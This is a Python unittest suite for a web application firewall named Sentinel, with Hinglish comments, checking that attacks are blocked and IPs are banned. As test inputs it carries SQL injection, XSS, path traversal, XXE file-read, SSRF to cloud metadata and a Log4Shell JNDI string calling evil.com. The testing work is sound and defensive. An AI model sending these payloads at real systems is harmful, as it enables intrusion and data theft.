"""
Automatic checks:  python -m unittest tests.test_basic -v
Ye batate hain ki system waise hi kaam kar raha hai jaisa socha tha.
"""
import os
import tempfile
import unittest
from urllib.parse import quote_plus

# Test ke liye alag temporary database (asli data kharab na ho)
_TMP = tempfile.mkdtemp()
os.environ["SENTINEL_DB"] = os.path.join(_TMP, "test.db")

from sentinel import db  # noqa: E402
from sentinel.app import app  # noqa: E402
from sentinel.engine import Sentinel  # noqa: E402


def ip_env(n):
    return {"REMOTE_ADDR": f"10.0.0.{n}"}


class WebsiteTests(unittest.TestCase):
    def setUp(self):
        self.c = app.test_client()

    def test_normal_pages_work(self):
        for i, path in enumerate(["/", "/about", "/products", "/product?id=2", "/search?q=pen"]):
            r = self.c.get(path, environ_overrides=ip_env(10 + i))
            self.assertEqual(r.status_code, 200, path)

    def test_sql_injection_blocked(self):
        r = self.c.get("/search", query_string={"q": "' OR 1=1 --"}, environ_overrides=ip_env(20))
        self.assertEqual(r.status_code, 403)

    def test_xss_blocked(self):
        r = self.c.get("/search", query_string={"q": "<script>alert(1)</script>"}, environ_overrides=ip_env(21))
        self.assertEqual(r.status_code, 403)

    def test_path_traversal_blocked(self):
        r = self.c.get("/product", query_string={"id": "../../etc/passwd"}, environ_overrides=ip_env(22))
        self.assertEqual(r.status_code, 403)

    def test_attack_in_post_body_blocked(self):
        r = self.c.post("/login", data={"username": "admin'--", "password": "x"}, environ_overrides=ip_env(23))
        self.assertIn(r.status_code, (403,))

    def test_correct_login_works(self):
        r = self.c.post("/login", data={"username": "demo", "password": "demo123"}, environ_overrides=ip_env(24))
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Welcome", r.data)

    def test_brute_force_gets_banned(self):
        env = ip_env(30)
        for i in range(5):
            r = self.c.post("/login", data={"username": "demo", "password": f"bad{i}"}, environ_overrides=env)
            self.assertEqual(r.status_code, 401)
        r = self.c.post("/login", data={"username": "demo", "password": "bad5"}, environ_overrides=env)
        self.assertEqual(r.status_code, 403)
        r = self.c.post("/login", data={"username": "demo", "password": "demo123"}, environ_overrides=env)
        self.assertEqual(r.status_code, 403, "banned IP ko sahi password par bhi andar nahi aana chahiye")

    def test_rate_limit(self):
        env = ip_env(31)
        codes = [self.c.get("/about", environ_overrides=env).status_code for _ in range(25)]
        self.assertIn(429, codes)
        self.assertEqual(codes[0], 200)

    def test_passwords_never_logged(self):
        self.c.post("/login", data={"username": "demo", "password": "S3cretPassw0rd"}, environ_overrides=ip_env(32))
        for e in db.recent_events(200):
            self.assertNotIn("S3cretPassw0rd", e["payload"])

    def test_dashboard_local_only_and_escapes_html(self):
        self.c.get("/search", query_string="q=<script>alert(1)</script>", environ_overrides=ip_env(33))
        page = self.c.get("/sentinel/dashboard").get_data(as_text=True)   # default IP 127.0.0.1
        self.assertIn("AI-Sentinel", page)
        self.assertNotIn("<script", page)            # attack text dashboard me script na bane
        self.assertIn("&lt;script&gt;", page)        # escape hokar dikhna chahiye
        r = self.c.get("/sentinel/dashboard", environ_overrides={"REMOTE_ADDR": "8.8.8.8"})
        self.assertEqual(r.status_code, 403)

    def test_dashboard_csv_export(self):
        self.c.get("/search", query_string="q=test-csv-audit-entry", environ_overrides=ip_env(34))
        r = self.c.get("/sentinel/export/csv")
        self.assertEqual(r.status_code, 200)
        self.assertIn("text/csv", r.content_type)
        csv_text = r.get_data(as_text=True)
        self.assertIn("id,timestamp,datetime,ip,method,path,payload", csv_text)
        self.assertIn("test-csv-audit-entry", csv_text)
        # Remote IP access must be blocked with 403
        r_remote = self.c.get("/sentinel/export/csv", environ_overrides={"REMOTE_ADDR": "8.8.8.8"})
        self.assertEqual(r_remote.status_code, 403)

    # ---------- P0: Header Inspection ----------
    def test_xss_in_cookie_blocked(self):
        self.c.set_cookie("session", "<script>alert(1)</script>")
        r = self.c.get("/about", environ_overrides=ip_env(40))
        self.assertEqual(r.status_code, 403, "Cookie me XSS detect hona chahiye")

    def test_sqli_in_referer_blocked(self):
        r = self.c.get("/about", headers={"Referer": "http://evil.com/' OR 1=1 --"},
                       environ_overrides=ip_env(41))
        self.assertEqual(r.status_code, 403, "Referer me SQLi detect hona chahiye")

    def test_sqli_in_auth_header_blocked(self):
        r = self.c.get("/about", headers={"Authorization": "Bearer ' UNION SELECT 1,2--"},
                       environ_overrides=ip_env(42))
        self.assertEqual(r.status_code, 403, "Authorization me SQLi detect hona chahiye")

    # ---------- P0: Security Response Headers ----------
    def test_security_headers_present(self):
        r = self.c.get("/", environ_overrides=ip_env(43))
        self.assertEqual(r.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertEqual(r.headers.get("X-Frame-Options"), "DENY")
        self.assertEqual(r.headers.get("X-XSS-Protection"), "1; mode=block")
        self.assertIn("Content-Security-Policy", r.headers)
        self.assertIn("Referrer-Policy", r.headers)

    def test_request_id_in_response(self):
        r = self.c.get("/", environ_overrides=ip_env(44))
        self.assertIn("X-Request-ID", r.headers)
        self.assertEqual(len(r.headers["X-Request-ID"]), 8)

    # ---------- P0: New Rules ----------
    def test_null_byte_injection_blocked(self):
        r = self.c.get("/search", query_string={"q": "file%00.php"}, environ_overrides=ip_env(45))
        self.assertEqual(r.status_code, 403, "Null byte injection detect hona chahiye")

    def test_ssrf_cloud_metadata_blocked(self):
        r = self.c.get("/search", query_string={"q": "http://169.254.169.254/latest/meta-data/"},
                       environ_overrides=ip_env(46))
        self.assertEqual(r.status_code, 403, "SSRF cloud metadata detect hona chahiye")

    def test_log4shell_blocked(self):
        r = self.c.get("/search", query_string={"q": "${jndi:ldap://evil.com/x}"},
                       environ_overrides=ip_env(47))
        self.assertEqual(r.status_code, 403, "Log4Shell detect hona chahiye")

    def test_xxe_blocked(self):
        r = self.c.post("/login", data='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                        content_type="text/xml", environ_overrides=ip_env(48))
        self.assertEqual(r.status_code, 403, "XXE detect hona chahiye")

    # ---------- P1: Health Check ----------
    def test_health_endpoint(self):
        r = self.c.get("/sentinel/health")
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertEqual(data["status"], "ok")
        self.assertIn("ml_enabled", data)
        self.assertIn("dry_run", data)
        self.assertIn("db_ok", data)
        # Remote access blocked
        r = self.c.get("/sentinel/health", environ_overrides={"REMOTE_ADDR": "8.8.8.8"})
        self.assertEqual(r.status_code, 403)

    # ---------- P1: Unban API ----------
    def test_unban_api(self):
        env = ip_env(50)
        # Pehle ban karwao (brute force se)
        for i in range(6):
            self.c.post("/login", data={"username": "demo", "password": f"wrong{i}"}, environ_overrides=env)
        r = self.c.get("/about", environ_overrides=env)
        self.assertEqual(r.status_code, 403, "IP banned hona chahiye")
        # Ab unban karo
        r = self.c.post("/sentinel/api/unban/10.0.0.50")
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertTrue(data["unbanned"])
        # Ab access milna chahiye
        r = self.c.get("/about", environ_overrides=env)
        self.assertEqual(r.status_code, 200, "Unban ke baad access milna chahiye")

    # ---------- P2: API Stats and Token Auth ----------
    def test_api_stats_endpoint(self):
        r = self.c.get("/sentinel/api/stats")
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertIn("total", data)
        self.assertIn("by_action", data)
        self.assertIn("by_category", data)

    def test_api_token_auth_remote_access(self):
        from sentinel import config
        orig_key = config.API_KEY
        try:
            config.API_KEY = "test-secret-key"
            remote_env = {"REMOTE_ADDR": "8.8.8.8"}
            # Without token: 403
            r = self.c.get("/sentinel/api/stats", environ_overrides=remote_env)
            self.assertEqual(r.status_code, 403)
            # With Bearer token: 200
            r = self.c.get("/sentinel/api/stats", headers={"Authorization": "Bearer test-secret-key"},
                           environ_overrides=remote_env)
            self.assertEqual(r.status_code, 200)
            # With X-API-Key header: 200
            r = self.c.get("/sentinel/api/stats", headers={"X-API-Key": "test-secret-key"},
                           environ_overrides=remote_env)
            self.assertEqual(r.status_code, 200)
        finally:
            config.API_KEY = orig_key


class EngineTests(unittest.TestCase):
    def test_ml_alone_never_blocks(self):
        s = Sentinel(use_ml=True, dry_run=False)
        weird = quote_plus("aZ9" * 60 + "!@$%^*" * 12)
        d = s.inspect("GET", "/search", [weird], "Mozilla/5.0", "10.7.7.7")
        self.assertEqual(d["rules"], [])          # koi rule match nahi
        self.assertTrue(d["ml_flag"])             # par ML ko ye ajeeb laga
        self.assertEqual(d["action"], "alert")    # to sirf alert, block nahi

    def test_dry_run_marks_not_enforced(self):
        s = Sentinel(use_ml=False, dry_run=True)
        d = s.inspect("GET", "/search", [quote_plus("' OR 1=1 --")], "Mozilla/5.0", "10.7.7.8")
        self.assertEqual(d["action"], "block")
        self.assertFalse(d["enforced"])

    def test_repeated_blocks_ban_ip_then_ban_expires(self):
        s = Sentinel(use_ml=False, dry_run=False)
        ip, t = "10.7.7.9", 1000.0
        for i in range(5):
            d = s.inspect("GET", "/search", [quote_plus("<script>x</script>")], "UA", ip, now=t + i)
            self.assertEqual(d["action"], "block")
        d = s.inspect("GET", "/", [], "UA", ip, now=t + 6)
        self.assertEqual(d["reason"], "IP temporarily banned")
        d = s.inspect("GET", "/", [], "UA", ip, now=t + 200)
        self.assertEqual(d["action"], "allow")

    def test_scanner_user_agent_alerts(self):
        s = Sentinel(use_ml=False)
        d = s.inspect("GET", "/", [], "sqlmap/1.7", "10.7.7.10")
        self.assertEqual(d["action"], "alert")

    def test_double_encoded_attack_is_caught(self):
        s = Sentinel(use_ml=False)
        d = s.inspect("GET", "/search", ["%2527%2520OR%25201%253D1"], "UA", "10.7.7.11")
        self.assertEqual(d["action"], "block")

    def test_ban_persistence_across_restart(self):
        import time
        s1 = Sentinel(use_ml=False, dry_run=False)
        ip = "10.88.88.88"
        # 5 blocks trigger ban and save to DB
        now = time.time()
        for i in range(5):
            s1.inspect("GET", "/search", [quote_plus("<script>x</script>")], "UA", ip, now=now + i)
        # Check that DB has this ban
        bans_in_db = db.load_active_bans()
        self.assertIn(ip, bans_in_db)
        # Create a new Sentinel instance (simulating server restart)
        s2 = Sentinel(use_ml=False, dry_run=False)
        # Should be banned immediately without any prior requests in s2
        d = s2.inspect("GET", "/", [], "UA", ip, now=now + 6)
        self.assertEqual(d["action"], "block")
        self.assertIn("temporarily banned", d["reason"])
        # Clean up
        s2.unban(ip)


if __name__ == "__main__":
    unittest.main()
